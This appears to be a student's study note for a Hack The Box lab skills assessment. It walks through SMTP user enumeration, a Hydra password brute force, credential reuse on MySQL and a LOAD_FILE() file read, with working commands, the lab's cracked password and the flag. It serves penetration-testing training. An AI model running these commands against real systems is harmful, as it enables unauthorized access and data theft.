## ID
117

## Module
Attacking Common Services

## Kind
lab

## Title
Skills Assessment — Easy (WIN-EASY)

## Description
Attack chain: SMTP user enumeration → password brute force → credential reuse on MySQL → arbitrary file read via `LOAD_FILE()` to retrieve `flag.txt` from the Administrator's Desktop.

## Tags
skills-assessment, smtp, mysql, credential-reuse, file-read, flag

## Commands
- nmap -Pn -sV -sC -p21,25,80,443,587,3306,3389 <TARGET>
- smtp-user-enum -M RCPT -U <WORDLIST> -D inlanefreight.htb -t <TARGET>
- hydra -l <EMAIL> -P <WORDLIST> -t 64 -f <TARGET> smtp
- mysql -u <USER> -p<PASS> -h <TARGET> --skip-ssl
- SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");

## What This Section Covers
A realistic multi‑service assessment. Starting from a target with multiple open ports, you enumerate a valid email user, crack the password, reuse those credentials on MySQL, and then abuse `LOAD_FILE()` to read the flag from the filesystem. This teaches credential reuse and the power of MySQL `FILE` privilege.

## Methodology

1. **Add target to /etc/hosts** – resolve `inlanefreight.htb` to the target IP.
2. **Port scan** – Identify open services (FTP, SMTP, HTTP, HTTPS, MySQL, RDP).
3. **SMTP user enumeration** – Use RCPT method to find `fiona@inlanefreight.htb`.
4. **SMTP password brute force** – Hydra with rockyou.txt finds `987654321`.
5. **Credential reuse** – Try the same password on MySQL (works).
6. **Enumerate MySQL** – Show databases, confirm `FILE` privilege.
7. **Read flag** – `LOAD_FILE()` on the Administrator's Desktop path.

## Multi‑step Workflow

```bash
# Step 1 – Add host resolution
sudo sh -c 'echo "<TARGET_IP> inlanefreight.htb" >> /etc/hosts'

# Step 2 – Port scan
nmap -Pn -sV -sC -p21,25,80,443,587,3306,3389 -T4 <TARGET_IP>
# Open ports: 21,25,80,443,587,3306,3389

# Step 3 – SMTP user enumeration
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -D inlanefreight.htb -t <TARGET_IP>
# Found: fiona@inlanefreight.htb

# Step 4 – Brute force SMTP password
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 64 -f <TARGET_IP> smtp
# Found: 987654321

# Step 5 – Connect to MySQL with same credentials
mysql -u fiona -p987654321 -h <TARGET_IP> --skip-ssl

# Step 6 – Inside MySQL, read the flag
SHOW DATABASES;
SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
# Output: HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|common-services]]  
← [[16-email-latest-vulns]] | [[19-skills-assessment-hard]] →
<!-- AUTO-LINKS-END -->
